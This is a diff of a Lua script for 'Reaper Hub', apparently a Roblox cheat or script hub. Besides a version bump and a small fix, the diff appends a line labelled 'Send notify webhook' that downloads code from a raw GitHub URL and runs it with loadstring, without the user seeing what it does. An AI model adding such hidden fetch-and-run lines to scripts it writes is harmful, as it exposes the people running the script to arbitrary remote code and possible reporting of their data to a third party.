@@ -21,7 +21,7 @@ local Camera = workspace.CurrentCamera
 --=========================
 local Window = Fluent:CreateWindow({
 Title = "Reaper Hub",
-SubTitle = "lib Beta 17.2",
+SubTitle = "lib Beta 17.3",
 TabWidth = 160,
 Size = UDim2.fromOffset(520, 360),
 Theme = "Reaper",
@@ -2430,5 +2430,10 @@ button.MouseButton1Click:Connect(function()
 end)
 
 -- Load Success
-task.wait("2")
+task.wait(2)
 print("Reaper Hub Loaded")
+
+
+-- Send notify webhook 
+task.wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swiftz007/Libwtf/refs/heads/main/Libwebhook.lua"))()
